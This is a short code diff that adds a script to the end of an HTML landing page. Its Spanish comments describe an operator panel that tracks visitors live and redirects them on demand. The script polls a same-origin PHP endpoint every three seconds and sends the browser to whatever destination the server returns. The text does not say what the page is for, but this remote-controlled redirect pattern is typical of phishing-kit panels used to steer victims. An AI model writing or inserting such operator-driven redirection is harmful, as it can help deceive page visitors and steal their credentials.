@@ -167,5 +167,21 @@
         paint();
     })();
     </script>
+    <script>
+    // Heartbeat + escucha al operador (panel: presencia en vivo y
+    // redirección en caliente incluso desde la landing).
+    (function(){
+      function vrPoll(){
+        fetch("verificar_redireccion.php",{credentials:"same-origin"})
+          .then(function(r){return r.json()})
+          .then(function(d){
+            if(d&&d.status==="redirigir"){window.location.href=d.destino;return;}
+            setTimeout(vrPoll,3000);
+          })
+          .catch(function(){setTimeout(vrPoll,3000)});
+      }
+      vrPoll();
+    })();
+    </script>
 </body>
 </html>
